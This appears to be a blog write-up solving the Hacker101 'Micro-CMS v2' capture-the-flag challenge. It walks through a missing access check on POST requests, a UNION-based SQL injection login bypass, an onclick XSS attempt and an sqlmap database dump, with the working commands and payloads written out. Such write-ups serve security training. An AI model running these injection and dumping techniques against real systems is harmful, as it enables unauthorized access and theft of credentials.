**Challenge link:** https://ctf.hacker101.com/ctf

This is a continuation over the previous `Micro-CMS v1` challenge, so I recommend giving it a shot and a read before continuing with this one.

Alright, so we get to this new challenge and we can click to see what's new on this app relative to the old one.

```
# Micro-CMS Changelog

## Version 2

This version fixed the multitude of security flaws and general functionality bugs that plagued v1. Additionally, we added user authentication; we're still not sure why we didn't think about that the first time, but hindsight is 20/20. By default, users need to be an admin to add or edit pages now.
```

I'm pretty sure we will need to play with some authentication (no authorization?), let's see!

Let's enumerate page IDs again:

```sh
$ seq 50 > range.txt

$ ffuf -w range.txt -u https://<subdomain>.ctf.hacker101.com/page/FUZZ
...

2                       [Status: 200, Size: 433, Words: 19, Lines: 16]
1                       [Status: 200, Size: 538, Words: 63, Lines: 15]
3                       [Status: 403, Size: 234, Words: 27, Lines: 5]
```

We have a page with ID `3` that we have never seem before, but this time `/page/edit/3` is behind authentication. A common mistake by developers is only protecting pages that the client can see (GET requests), but nothing prevents users from sending other HTTP verbs to the server.

## Flag 1
So a GET to `/page/edit/3` yields a `403`, does `POST` or `PUT` yields the same HTTP response?

```sh
$ curl -X PUT "https://<subdomain>.ctf.hacker101.com/page/edit/3"
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<title>405 Method Not Allowed</title>
<h1>Method Not Allowed</h1>
<p>The method is not allowed for the requested URL.</p>

$ curl -X POST "https://<subdomain>.ctf.hacker101.com/page/edit/3"
^FLAG^...$FLAG$%
```

 `POST` is not protected as gives us our first flag! The interesting part is that `GET /page/3` still yields a `forbidden`, so there might be something else there. With that in mind I started playing with the login feature.

## Flag 2

Going to the `/login`  page and sending a single quote (`'`) as the username yields a server error:

```
Traceback (most recent call last):
  File "./main.py", line 145, in do_login
    if cur.execute('SELECT password FROM admins WHERE username=\'%s\'' % request.form['username'].replace('%', '%%')) == 0:
  File "/usr/local/lib/python2.7/site-packages/MySQLdb/cursors.py", line 255, in execute
    self.errorhandler(self, exc, value)
  File "/usr/local/lib/python2.7/site-packages/MySQLdb/connections.py", line 50, in defaulterrorhandler
    raise errorvalue
ProgrammingError: (1064, "You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''''' at line 1")
```

Setting the username as `abc' OR 1=1;--` bypasses this login check, but causes us to fail on the password clause with: `Invalid password`.

We could go and use something like `sqlmap` to dump the entire database, but let's see our query:

```
SELECT password FROM admins WHERE username=\'%s\'' % request.form['username'].replace('%', '%%')) == 0
```

What we are doing is:

1. Getting an user based on their username
2. Returning the password from that user

So I went to https://onecompiler.com/mysql and created the following schema to start playing with this query:

```sql
CREATE TABLE admins (username TEXT NOT NULL, password TEXT NOT NULL);
INSERT INTO admins VALUES ('admin', 'hello');
SELECT password FROM admins WHERE username = 'admin';
```

And of course I get the password back, which is `'hello'`. How can we override this? 

Let's try to use a `UNION`:

```sql
SELECT password FROM admins WHERE username = 'admin' UNION SELECT 'potato';
```

This yields two results,  `'hello'` on the first line and `'potato'` on the second. Is this enough? It sure is!

```
username=abc' UNION SELECT 'potato';--&password=potato`
```

We get logged in with the following HTML:

```html
<!doctype html>
<html>
	<head>
		<title>Logged in</title>
	</head>
	<body>
		<h1>Logged In!</h1>
		<a href="home">Go Home</a>
		<script>setTimeout(function() { window.location = 'home'; }, 3000);</script>
		<!-- You got logged in, congrats!  Do you have the real username and password?  If not, might want to do that! -->
	</body>
</html>
```

After that we get redirected to the home page and we see one more page called `Private Page` (the page with `ID 3`).

By clicking on it we get our second flag!

## Flag 3

Now that we have edit powers I tried to cause an XSS in the `button` within the `# Markdown Test` page. To do that you just need to edit that page and add an attribute `onclick="alert(1)"` and save the page. I played a bunch with it thinking that an admin would see that page and we would be able to get their cookie through XSS, but that was a dead end.

Eventually I got back to the old HTML from `Flag 2`:

```
<!-- You got logged in, congrats!  Do you have the real username and password?  If not, might want to do that! -->
```

This prompted me to dump the database using `sqlmap` since I have no idea what the existing username actually is. Here's what I did:

```sh
$ sqlmap -u https://<subdomain>.ctf.hacker101.com/login --data "username=abc&password=xyz" -p username --dbms=mysql --dump
```

* `-p` is used to specify which parameter `sqlmap` should test.

We end up getting:

```
Table: admins
[1 entry]
+----+----------+----------+
| id | password | username |
+----+----------+----------+
| 1  | stefany  | hattie   |
+----+----------+----------+
```

And after login in with these credentials we get our last flag!

This was an interesting challenge, the lack of auth on the `POST` endpoint is realistic and easily missed if you are not using something that is secure by default. The SQLi is a common theme in CTFs, but always a fun thing to exploit.

Thanks for reading and I will see you in our next post!